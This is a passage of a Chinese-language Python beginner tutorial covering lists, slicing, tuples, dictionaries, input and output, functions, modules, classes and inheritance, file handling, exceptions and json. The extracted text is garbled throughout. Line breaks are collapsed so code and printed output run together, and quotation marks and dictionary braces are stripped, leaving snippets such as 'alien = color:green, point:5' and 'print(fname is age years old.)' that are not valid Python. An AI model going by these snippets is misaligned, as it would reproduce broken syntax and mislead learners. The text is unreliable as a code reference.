# 在指定位置插入元素print(list1)print(list2) [1, 2, 3, 4, 5][‘Monday’, ‘Wednesday’, ‘Thursday’, ‘Friday’, ‘Saturday’, ‘Sunday’] [1, 3, 4, 5][‘Monday’, ‘Tuesday’, ‘Wednesday’, ‘Thursday’, ‘Friday’, ‘Saturday’, ‘Sunday’] 使用 sort() 对列表进行永久性排序，使用 sorted() 进行暂时排序 使用remove()方法删除特定值（第一次出现） list1 = [1,2,0,3,0,4,0,5]print(list1)while 0 in list1: list1.remove(0)print(list1) [1, 2, 0, 3, 0, 4, 0, 5][1, 2, 3, 4, 5] 使用 reverse() 反转列表 list1 = [1,2,3,4]list1.reverse() # 反转列表print(sorted(list1)) # sorted 排序,这是个 全局函数print(list1)list1.sort() # sort 排序，这是列表类 内置函数print(list1) [1, 2, 3, 4][4, 3, 2, 1][1, 2, 3, 4] 使用全局函数 len() 获得列表长度 for ... in ...: 遍历 使用 range(start,end,step) 创建数字列表 list1 = [1,2,3,4]for num in list1: print(num)for i in range(1,6,2): print(i) 对数字列表进行统计 list1 = [2,4,3,1,5]print(min(list1))print(max(list1))print(sum(list1)) 1515 列表解析 squares = [value**2 for value in range(1,11)]print(squares) [1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 切片 squares = [ i for i in range(0,10)]print(squares[1:4])print(squares[:4])print(squares[1:]) [1, 2, 3][0, 1, 2, 3][1, 2, 3, 4, 5, 6, 7, 8, 9] 省略起始和终止索引表示从头开始或直到结尾结束 同时省略即可复制列表 元组与列表相似，不同之处是使用圆括号、值不能修改 for...in... 遍历 元组不能修改元素，只能重新赋值 字典字典是一系列键值对，使用键索引值，也可以直接创建新的键并赋值 alien = color:green, point:5print(alien)alien[x] = 1alien[y] = 1print(alien) {‘color’: ‘green’, ‘point’: 5}{‘color’: ‘green’, ‘point’: 5, ‘x’: 1, ‘y’: 1} 字典的值可以直接修改 使用 del 删除某一键值对 for key,value in dictionary.items(): 进行遍历 for key in dictionary.keys(): 仅对键进行遍历 for key in dictionary： 默认也是仅对键进行遍历 keys() 实际上返回一个键的列表 for value in dictiondary.values(): 对值进行遍历 dictiondary.values() 返回一个值列表，为了过滤重复值可使用 set(dictiondary.values()) 字典没有固定存储顺序，只关心键值的关联关系 输入输出输入 使用 input 输入字符串 message = input(please input: )print(Hello, + message) please input: yangHello,yang 使用 int 获取转换数字字符串为数字 message = input(please input a number: )num = int(message)print(num**2) please input a number: 525 输出使用 print() 进行输出 f-string name = Aliceage = 25print(fname is age years old.) # 输出：Alice is 25 years old. 控制输出格式 分隔符 sep print(Python, Java, C++, sep= | ) # 输出：Python | Java | C++ 结束符 end print(Hello, end= ) # 不换行print(World) # 输出：Hello World 输出到文件 with open(output.txt, w) as f: print(Save to file, file=f) 打印原始数据 s = Hello Worldprint(repr(s)) # 输出：Hello World 彩色输出 使用 colorama或 ANSI 转义码 print(\\033[31mRed Text\\033[0m) # 红色文字 换行Python 会忽略代码里 []、 和 () 中的换行，因此如果代码里有多行的列表、列表推导、生成器表达式、字典这一类的，可以省略不太好看的续行符 \\。 函数 参数： 位置实参（根据参数顺序传递实参） 关键字实参：传递给函数 名称-值 对， 默认形参：可给每个形参设定默认值，而不用传递实参 返回值：可以返回一个数或一组数（任何类型） 向函数传递一个列表，但是不希望修改列表时，可以传递副本 list1[:] 形参前加 *，可以传递任意数量的实参，Python 将实参封装到一个元组中 def fun1(*Param): length = len(Param) print(f参数数量:length) print(type(Param)) for p in Param: print(p)fun1(a,b,c) 参数数量:3class ‘tuple’abc 形参前加 ** ，可以传递任意数量键值对，Python 将实参封装到一个字典中 模块import module_name 导入模块，可以使用模块中的函数 from module_name import function_name 导入函数，可以直接使用函数 from module_name import function_name as new_name 导入函数并指定别名 同样可以用 as 给导入模块指定别名 from module_name import * 可以导入模块中的所有函数 类与继承class Dog(): def __init__(self,name,age): self.name = name self.age = age def sit(self): print(self.name.title() + is now sitting.) def roll_over(self): print(self.name.title() + rolled over!)d = Dog(ayyyy,12)d.roll_over()d.sit() Ayyyy rolled over!Ayyyy is now sitting. **__init__**是特殊方法，会在类被创建时自动运行，用于初始化类 示例.属性 称为句点表示法，可以访问属性以及方法（方法也可以视为属性） 继承： 子类的定义 class Doggg(Dog) ，必须在括号内指定父类的名称 **__init__ **重写，使用super().__init__(name,age) 调用父类的初始化函数 此外可以对子类写独特的方法，也可以重写父类方法，子类实例优先执行子类方法 动态创建类实例： 定义字典：实现动态绑定到类，**init_params将字典解包为关键字参数，传递给 cipher_class 的构造函数 __init__ # 定义选项到类的映射cipher_map = 1: (Base64Decoder, ), # 无需额外参数 2: (CaesarCipher, shift: None), # 偏移量# ................cipher_class, init_params = cipher_map[n]cipher = cipher_class(ciphertext, **init_params) 文件和异常文件： filename = test.txt# r : 默认只读# w : 写入模式，会清空内容，或新建文件# a : 附加模式# r+ : 读取和写入with open(filename,w) as f: f.write(Hello World)with open(filename) as f: contents = f.read() print(contents)with open(filename) as f: contents = f.readlines() print(contents) 异常： try: # 正常的操作，可能抛出异常的代码 语句except (Exception1, Exception2, ..., ExceptionN): # 捕获指定的异常，执行这块代码 语句except: # 可选，捕获其他未指定的异常 # 捕获所有其他异常（不推荐，除非明确需要） 语句else: # 如果 try 块没有抛出异常，执行这块代码 语句finally: # 无论是否发生异常，这块代码总会执行 语句 raise ExceptionType(错误信息) pass # 占位符，什么都不做 json存储数据 json.dump() json.load() import jsonfilename = test.jsonnumbers = [1,2,3,4,5]with open(filename,w) as f: json.dump(numbers,f)with open(filename) as f: data = json.load(f) print(data)","categories":["Language"]}]